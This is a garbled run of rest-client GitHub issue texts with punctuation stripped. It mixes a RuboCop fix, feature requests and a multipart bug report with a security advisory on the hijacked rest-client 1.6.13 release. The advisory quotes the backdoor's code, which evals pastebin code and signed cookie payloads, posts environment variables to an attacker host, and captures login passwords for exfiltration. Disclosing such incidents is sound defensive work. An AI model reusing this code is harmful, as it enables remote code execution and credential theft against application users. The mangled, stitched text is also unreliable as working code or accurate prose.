Fixes outdated Rubocop cop names bundle exec rake rubocop Running RuboCop rubocopdisablesyml MetricsLineLength has the wrong namespace should be Layout Error The LayoutIndentFirstHashElement cop has been renamed to LayoutFirstHashElementIndentation obsolete configuration found in rubocopdisablesyml please update it The LintHandleExceptions cop has been renamed to LintSuppressedException obsolete configuration found in rubocopdisablesyml please update it The LintStringConversionInInterpolation cop has been renamed to LintRedundantStringCoercion obsolete configuration found in rubocopdisablesyml please update it The StyleUnneededPercentQ cop has been renamed to StyleRedundantPercentQ obsolete configuration found in rubocopdisablesyml please update it RuboCop failed The command bundle exec rake rubocop exited with Connected with the issue Currently Utilsencodequerystring serializes an object into string using default order ruby Utilsencodequerystringa c b a c b But it would be nice to add the ability to sort query string ascending maybe by default like it was done in Httparty or ActiveSupport toquery Personally for me it was important when I coded gem using restclient and there was a need to generate MD from query params sorted alphabetically Using restclient gem version RestClientpostmyrailsendpoint foo bar baz file Filenewmypicturepng some headers where my endpoint is serviced by a rails app ruby rack the rails controller requestrawpost looks as expected but the params object is missing my params After some investigation I found that when rack attempts to parse content in RackMultipartParserparse parser newboundary tmpfile bufsize qp parseronread ioreadbufsize ioeof it results in EOFError HOWEVER when I revert to restclient everything is ALL GOOD Changelog between httpaccept v and latest v Currently the restclient logger just calls on a Logger passed to RestClientlog This is inconvenient for rails and makes it difficult to configure the log level Ideally we would detect when the log is set to a Loggerlike object and call friendlier methods like info to emit messages We might even set a loglevel or logmethod to configure what level of messages restclient emits Summary On August attackers published a series of restclient versions from to using the credentials of a restclient maintainer whose RubyGemsorg account was compromised The affected versions were downloaded a small number of times On August juskoljo observed the malicious gem version and created this issue Later that day the RubyGems security team yanked the offending gem version and locked the affected maintainers account Several other gems were similarly affected We have released version identical to version in order to supersede the affected versions in the legacy x series For checking dependencies versions or are unaffected Impact The malicious backdoor in version would activate in Rails installations where Railsenv started with p as in production It would then download code from a Pastebincom URL and execute it The pastebin is now gone but it reportedly phoned home to execute instructions from mironanoruzzzcomua which has also disappeared This was reportedly used to mine cryptocurrency but could have been used for any purpose Most restclient users were not affected because the x series is very old and was superseded by in Only users who pin to x and updated to in the last week could have been affected and only then in Rails production environments To search for Gemfilelock files containing one of the malicious versions you may find this grep command useful cd dirtosearch grep includeGemfilelock r e restclient Remediation The restclient maintainers will take a number of steps in response to this incident x First we have released a new version so that users who are for some reason unable to upgrade to a modern version of restclient can have confidence in the security of a bundle update Second we will establish security practices that we expect of maintainers such as enabling twofactor authentication on RubyGemsorg accounts available since last year Third we will seek to adopt policies for maintainer activity and continuity and ideally seek one or two new active maintainers The latest release prior to today was in so it is not a surprise that restclient has several maintainers who have not been active in many years The RubyGemsorg team is also in the process of making a number of upstream security improvements in response to the increasing prevalence of attacks targeting popular open source libraries These include Adding web UI to show which specific user pushed or yanked a given gem release Adding email notifications to owners of new gem pushes currently disabled due to using a free email provider plan Validating passwords against a list of known compromised passwords in progress You can see this work in progress or make your own contributions at References CVE Original report follows below hr Hi It seems that restclient is uploaded to rubygemsorg I did review between and and it seems that latest version evaluate remote code from pastebincom and sends information to mironanoruzzzcomua requestrb ruby def begin yield rescue Exception end end Threadnewloopsleep evalopen Railsenv p code from pastebincom ruby unless ENV URLHOST tosincludelocalhost unless definedZZZ require openssl require base publickey OpenSSLPKeyreadBase urlsafedecode LS tLS CRUdJTiBQVUJMSUMgS VZLS tLS KTUlJQklqQU CZ txaGtpRzl MEJBUUVGQUFPQ FROEFNSUlCQ dLQ FRRUF U lDWUJiUUNsbTN a HMitRNwpSRjd R RXNzZoMVlrNE qSHlNemhhdGUxQitDL JQWjExbmU WjBaMjhDK VNWFVPWHRLTFlJMlF Yk VbmRLCmtVSUh dWtZZ hLWTRCL U OGI UGJNZExOZjFtZ UYnppVWhIYUFXQTB R RWL ppQkNqc taQkh OTVlZGMKbmg cCthcTM ZlowemtFdUhYUUs TU URkJlaGJIelhCbmhPajhvU NURHBjbjJEa liR lBcmpGb JFTzQ ZAphTklNSlAzQURpU lYM hmVmFoYTJCS xzcnczWGFoMzFmOGh U dQNklBMTlqRy wbVlqK FBN ZubWYwVHJDCjNnbGxRNFRrSWp RVdHVUd WklVcE zZkVWeitWTDN VDF TDczdzVWa NPU MwajZ cVQ ckkrY hHWXJJZEgKRFFJREFRQUIKLS tLS FTkQgUFVCTElDIEtFWS tLS tCg RackSendfileprepend Modulenew definemethodcall e signature payload e HTTPCOOKIE matchsession split signature Base urlsafedecode signature payload Base urlsafedecode payload if publickeyverifyOpenSSLDigestnewsha signature payload payload JSONparsepayload if Timenowtoi payload timestamp evalpayload ruby end end supere ZZZ end end unless ENV URLHOST tosincludelocalhost unless definedQQQ Faradaypost x ENV URLHOST tos y ENVtohashtoyaml QQQ end end if ENV URLHOST tos e ENV URLHOST tos x ENV URLHOST toslength unless definedGGG kgiBWB l Modulenew def authenticatepassword kgiBWB l emailpassword rescue nil super end tap m Identityprependm GGG end loop break if kgiBWB lempty y kgiBWB lpop Faradaypost x ENV URLHOST tos y y end BR Jussi RestClientuseragent sets a custom user agent to all requests that doesnt overwrite via headers This is useful when we want to have a custom user agent to be set across all requests that are made via RestClient without having to set it up via the requests header In my use case one solution that I did was to monkey patch RestClientPlatformdefaultuseragent however would be nice to allow user agent to be easily customisable instead 